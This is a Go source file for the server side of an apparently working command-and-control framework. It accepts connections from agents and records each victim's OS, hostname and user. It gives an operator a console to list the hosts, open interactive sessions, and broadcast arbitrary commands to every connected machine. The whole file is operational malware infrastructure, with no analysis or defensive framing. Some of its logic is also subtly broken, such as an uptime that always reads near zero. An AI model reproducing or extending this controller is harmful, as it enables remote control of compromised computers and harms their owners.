package server

import (
	"bufio"
	"c2-framework/internal/common"
	"crypto/tls"
	"encoding/json"
	"fmt"
	"log"
	"net"
	"os"
	"strings"
	"sync"
	"time"
)

type Server struct {
	clients map[string]*common.Client
	mutex   sync.RWMutex
	port    string
	useTLS  bool
}

func NewServer(port string, useTLS bool) *Server {
	return &Server{
		clients: make(map[string]*common.Client),
		port:    port,
		useTLS:  useTLS,
	}
}

func (s *Server) Start() {
	if s.useTLS {
		s.startTLS()
	} else {
		s.startInsecure()
	}
}

func (s *Server) startTLS() {
	cert, err := tls.LoadX509KeyPair("server.crt", "server.key")
	if err != nil {
		log.Println("Warning: Could not load TLS certificate, starting in insecure mode")
		s.startInsecure()
		return
	}

	config := &tls.Config{Certificates: []tls.Certificate{cert}}
	listener, err := tls.Listen("tcp", ":"+s.port, config)
	if err != nil {
		log.Fatalf("Failed to start TLS server: %v", err)
	}
	defer listener.Close()

	fmt.Printf("🔒 C2 Server started on port %s (TLS Encrypted)\n", s.port)
	s.startCLI()
	s.acceptConnections(listener)
}

func (s *Server) startInsecure() {
	listener, err := net.Listen("tcp", ":"+s.port)
	if err != nil {
		log.Fatalf("Failed to start server: %v", err)
	}
	defer listener.Close()

	fmt.Printf("⚠️  C2 Server started on port %s (INSECURE - No Encryption)\n", s.port)
	s.startCLI()
	s.acceptConnections(listener)
}

func (s *Server) acceptConnections(listener net.Listener) {
	for {
		conn, err := listener.Accept()
		if err != nil {
			log.Printf("Failed to accept connection: %v", err)
			continue
		}
		go s.handleClient(conn)
	}
}

func (s *Server) startCLI() {
	go func() {
		s.showBanner()
		scanner := bufio.NewScanner(os.Stdin)
		for {
			fmt.Print("C2> ")
			if !scanner.Scan() {
				break
			}
			input := strings.TrimSpace(scanner.Text())
			s.handleCommand(input)
		}
	}()
}

func (s *Server) showBanner() {
	fmt.Println("╔══════════════════════════════════════╗")
	fmt.Println("║           C2 Framework v1.0          ║")
	fmt.Println("║         Command & Control            ║")
	fmt.Println("╚══════════════════════════════════════╝")
	fmt.Println("Type 'help' for available commands")
	fmt.Println()
}

func (s *Server) handleCommand(input string) {
	parts := strings.Fields(input)
	if len(parts) == 0 {
		return
	}

	switch parts[0] {
	case "help":
		s.showHelp()
	case "list", "clients":
		s.listClients()
	case "select":
		if len(parts) < 2 {
			fmt.Println("❌ Usage: select <client_id>")
			return
		}
		s.selectClient(parts[1])
	case "broadcast", "all":
		if len(parts) < 2 {
			fmt.Println("❌ Usage: broadcast <command>")
			return
		}
		command := strings.Join(parts[1:], " ")
		s.broadcastCommand(command)
	case "remove", "kick":
		if len(parts) < 2 {
			fmt.Println("❌ Usage: remove <client_id>")
			return
		}
		s.removeClient(parts[1])
	case "status":
		s.showStatus()
	case "clear":
		s.clearScreen()
	case "quit", "exit":
		fmt.Println("👋 Shutting down C2 server...")
		os.Exit(0)
	default:
		fmt.Printf("❌ Unknown command: %s. Type 'help' for available commands.\n", parts[0])
	}
}

func (s *Server) showHelp() {
	fmt.Println("📋 Available Commands:")
	fmt.Println("  help                 - Show this help menu")
	fmt.Println("  list/clients         - List all connected clients")
	fmt.Println("  select <client_id>   - Interactive session with client")
	fmt.Println("  broadcast <command>  - Send command to all clients")
	fmt.Println("  remove <client_id>   - Disconnect a client")
	fmt.Println("  status              - Show server status")
	fmt.Println("  clear               - Clear screen")
	fmt.Println("  quit/exit           - Shutdown server")
	fmt.Println()
}

func (s *Server) listClients() {
	s.mutex.RLock()
	defer s.mutex.RUnlock()

	if len(s.clients) == 0 {
		fmt.Println("📭 No clients connected")
		return
	}

	fmt.Printf("👥 Connected Clients (%d):\n", len(s.clients))
	fmt.Println("┌─────────────────┬──────────────┬─────────────┬──────────────┬─────────────┐")
	fmt.Println("│ Client ID       │ OS/Arch      │ Hostname    │ User         │ Last Seen   │")
	fmt.Println("├─────────────────┼──────────────┼─────────────┼──────────────┼─────────────┤")

	for id, client := range s.clients {
		lastSeen := time.Since(client.LastSeen).Truncate(time.Second)
		fmt.Printf("│ %-15s │ %-12s │ %-11s │ %-12s │ %-11s │\n",
			s.truncate(id, 15),
			s.truncate(client.Info.OS+"/"+client.Info.Arch, 12),
			s.truncate(client.Info.Hostname, 11),
			s.truncate(client.Info.User, 12),
			lastSeen.String())
	}
	fmt.Println("└─────────────────┴──────────────┴─────────────┴──────────────┴─────────────┘")
}

func (s *Server) truncate(str string, length int) string {
	if len(str) <= length {
		return str
	}
	return str[:length-3] + "..."
}

func (s *Server) selectClient(clientID string) {
	s.mutex.RLock()
	client, exists := s.clients[clientID]
	s.mutex.RUnlock()

	if !exists {
		fmt.Printf("❌ Client %s not found\n", clientID)
		return
	}

	fmt.Printf("🎯 Selected client: %s (%s)\n", clientID, client.Info.Hostname)
	fmt.Println("Type 'back' to return to main menu")

	scanner := bufio.NewScanner(os.Stdin)
	for {
		fmt.Printf("%s> ", s.truncate(clientID, 10))
		if !scanner.Scan() {
			break
		}
		command := strings.TrimSpace(scanner.Text())
		if command == "back" || command == "exit" {
			break
		}
		if command == "" {
			continue
		}

		s.sendCommand(client, command)
		time.Sleep(100 * time.Millisecond) 
	}
}

func (s *Server) broadcastCommand(command string) {
	s.mutex.RLock()
	clientCount := len(s.clients)
	s.mutex.RUnlock()

	if clientCount == 0 {
		fmt.Println("📭 No clients connected")
		return
	}

	fmt.Printf("📢 Broadcasting to %d clients: %s\n", clientCount, command)

	s.mutex.RLock()
	for _, client := range s.clients {
		go s.sendCommand(client, command)
	}
	s.mutex.RUnlock()
}

func (s *Server) sendCommand(client *common.Client, command string) {
	msg := common.Message{
		Type:      "command",
		Command:   command,
		Timestamp: time.Now().Unix(),
	}

	data, _ := json.Marshal(msg)
	conn := client.Conn.(net.Conn)
	_, err := conn.Write(append(data, '\n'))
	if err != nil {
		log.Printf("Failed to send command to client %s: %v", client.ID, err)
		s.removeClientByID(client.ID)
	}
}

func (s *Server) handleClient(conn net.Conn) {
	defer conn.Close()
	remoteAddr := conn.RemoteAddr().String()

	decoder := json.NewDecoder(conn)
	var client *common.Client

	for {
		var msg common.Message
		if err := decoder.Decode(&msg); err != nil {
			if client != nil {
				s.removeClientByID(client.ID)
			}
			return
		}

		switch msg.Type {
		case "register":
			client = s.registerClient(conn, msg, remoteAddr)
		case "result":
			if client != nil {
				fmt.Printf("\n[%s] 📤 Result:\n%s\nC2> ", client.ID, msg.Result)
				client.LastSeen = time.Now()
			}
		case "heartbeat":
			if client != nil {
				client.LastSeen = time.Now()
			}
		}
	}
}

func (s *Server) registerClient(conn net.Conn, msg common.Message, remoteAddr string) *common.Client {
	var info common.ClientInfo
	json.Unmarshal([]byte(msg.Result), &info)
	info.IP = strings.Split(remoteAddr, ":")[0]

	clientID := msg.ClientID
	if clientID == "" {
		clientID = fmt.Sprintf("client_%d", time.Now().Unix())
	}

	client := &common.Client{
		ID:       clientID,
		Conn:     conn,
		LastSeen: time.Now(),
		Info:     info,
	}

	s.mutex.Lock()
	s.clients[clientID] = client
	s.mutex.Unlock()

	fmt.Printf("\n✅ New client connected: %s (%s@%s)\nC2> ",
		clientID, info.User, info.Hostname)
	return client
}

func (s *Server) removeClient(clientID string) {
	s.mutex.Lock()
	defer s.mutex.Unlock()
	s.removeClientByID(clientID)
}

func (s *Server) removeClientByID(clientID string) {
	if client, exists := s.clients[clientID]; exists {
		if conn, ok := client.Conn.(net.Conn); ok {
			conn.Close()
		}
		delete(s.clients, clientID)
		fmt.Printf("\n❌ Client disconnected: %s\nC2> ", clientID)
	}
}

func (s *Server) showStatus() {
	s.mutex.RLock()
	defer s.mutex.RUnlock()

	fmt.Printf("📊 Server Status:\n")
	fmt.Printf("  Port: %s\n", s.port)
	fmt.Printf("  TLS: %t\n", s.useTLS)
	fmt.Printf("  Connected Clients: %d\n", len(s.clients))
	fmt.Printf("  Uptime: %s\n", time.Since(time.Now()).String())
}

func (s *Server) clearScreen() {
	fmt.Print("\033[2J\033[H")
	s.showBanner()
}

